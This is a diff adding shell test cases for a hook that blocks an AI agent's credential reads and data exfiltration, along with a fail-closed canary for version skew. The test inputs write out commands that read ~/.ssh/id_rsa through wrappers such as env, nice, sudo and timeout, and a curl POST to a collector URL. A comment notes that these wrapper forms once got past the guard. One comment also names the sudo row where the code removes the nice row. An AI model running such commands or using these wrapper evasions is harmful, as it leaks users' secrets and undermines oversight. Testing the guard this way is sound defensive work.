@@ -127,6 +127,81 @@ test_case "EXT-POS-E4: assignment-prefixed curl POST blocks" \
 test_case "EXT-FP-E1: quoted ssh-path as message content allows" \
   "$(bash_payload 'git commit -m "do not cat ~/.ssh/id_rsa in logs"')" 0
 
+# ----- EXT-POS (#8314): the canonicalizer walks a wrapper's own grammar -----
+#
+# The identical credential read, reached through an absolute-path wrapper (E5), a wrapper
+# missing from the set (E6, E7), a condition position (E8), a wrapper flag that takes no
+# argument (E9) and a wrapper option that takes a separate argument (E10); and the POST rule
+# behind a missing wrapper and its duration (E11). Each allowed before the canonicalizer
+# walked wrapper grammar.
+test_case "EXT-POS-E5: /usr/bin/env cat ~/.ssh/id_rsa blocks (absolute-path wrapper)" \
+  "$(bash_payload '/usr/bin/env cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E6: nice cat ~/.ssh/id_rsa blocks (wrapper missing from the set)" \
+  "$(bash_payload 'nice cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E7: stdbuf -o0 cat ~/.ssh/id_rsa blocks (wrapper missing from the set)" \
+  "$(bash_payload 'stdbuf -o0 cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E8: if-condition cat ~/.ssh/id_rsa blocks (condition position)" \
+  "$(bash_payload 'if cat ~/.ssh/id_rsa ; then :; fi')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E9: sudo -n cat ~/.ssh/id_rsa blocks (wrapper flag that takes no argument)" \
+  "$(bash_payload 'sudo -n cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E10: env -C /tmp cat ~/.ssh/id_rsa blocks (wrapper option with a separate argument)" \
+  "$(bash_payload 'env -C /tmp cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E11: timeout 30 curl POST blocks (wrapper missing from the set, with its duration)" \
+  "$(bash_payload 'timeout 30 curl -X POST https://example.com/collect')" 2 "BLOCK-EGRESS-004"
+
+test_case "EXT-FP-E2: a describe-only command naming a read verb allows" \
+  "$(bash_payload 'command -v cat')" 0
+
+# ----- CMDPOS-SKEW (#8314): the canonicalizer's version-skew canary -----
+#
+# The hook trusts the shared canonicalizer only after two probes: a one-line function body,
+# and a wrapper carrying a separate-argument option before a benign word, whose canonical
+# form exposes the word only on the walk that reads wrapper grammar. A copy that predates
+# that grammar, or whose row table is damaged, passes the first probe and fails the second,
+# so in enforce the hook fails CLOSED. Modelled by a copy whose sudo row is removed; the
+# control is the same sandbox with the shipped copy.
+cps_root="$(/usr/bin/mktemp -d)"
+cps_hooks="${cps_root}/.claude/hooks"
+/bin/mkdir -p "${cps_hooks}/lib"
+/bin/cp "${HOOK%/*}/lib/"*.sh "${cps_hooks}/lib/" 2>/dev/null || true
+/bin/cp "$HOOK" "${cps_hooks}/block-egress.sh"
+/usr/bin/printf 'enforce' > "${cps_hooks}/.mode"
+cps_run() { # $1 = command -> CPS_RC and CPS_ERR
+  CPS_RC=0
+  CPS_ERR="$( ( unset PMO_SCOPE_GUARD_ROOT CLAUDE_WORKSPACE_ROOT
+      /usr/bin/printf '%s' "$(bash_payload "$1" "$cps_root")" | /bin/bash "${cps_hooks}/block-egress.sh" 2>&1 >/dev/null ) )" || CPS_RC="$?"
+}
+/usr/bin/sed -e 's/WROW\["nice"\]=1//' "${HOOK%/*}/lib/command-position.awk" > "${cps_hooks}/lib/command-position.awk"
+cps_live=0
+if ! /usr/bin/cmp -s "${HOOK%/*}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk" \
+   && ! /usr/bin/grep -q -F 'WROW["nice"]' "${cps_hooks}/lib/command-position.awk"; then cps_live=1; fi
+cps_run 'echo hello'
+if [ "$cps_live" = 1 ] && [ "$CPS_RC" = 2 ] && /usr/bin/printf '%s' "$CPS_ERR" | /usr/bin/grep -q 'PRIMITIVE-MISSING'; then
+  /usr/bin/printf 'PASS: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar fails the hook closed in enforce (exit 2, PRIMITIVE-MISSING)\n'
+  PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar did not fail the hook closed (mutant live=%s, exit=%s): %s\n' "$cps_live" "$CPS_RC" "$CPS_ERR"
+  FAIL=$((FAIL + 1))
+fi
+/bin/cp "${HOOK%/*}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk"
+cps_run 'echo hello'
+cps_ctl_benign="$CPS_RC"
+cps_run 'cat ~/.ssh/id_rsa'
+if [ "$cps_ctl_benign" = 0 ] && [ "$CPS_RC" = 2 ] && /usr/bin/printf '%s' "$CPS_ERR" | /usr/bin/grep -q 'BLOCK-EGRESS-001'; then
+  /usr/bin/printf 'PASS: CMDPOS-SKEW-CTL the same sandbox with the shipped canonicalizer allows a benign command and refuses the plain form\n'
+  PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: CMDPOS-SKEW-CTL the sandbox with the shipped canonicalizer is not live (benign exit=%s, plain-form exit=%s)\n' "$cps_ctl_benign" "$CPS_RC"
+  FAIL=$((FAIL + 1))
+fi
+/bin/rm -rf "$cps_root"
+
 test_case "cat .env blocks (project .env)" \
   "$(bash_payload 'cat .env')" 2 "BLOCK-EGRESS-002"
 
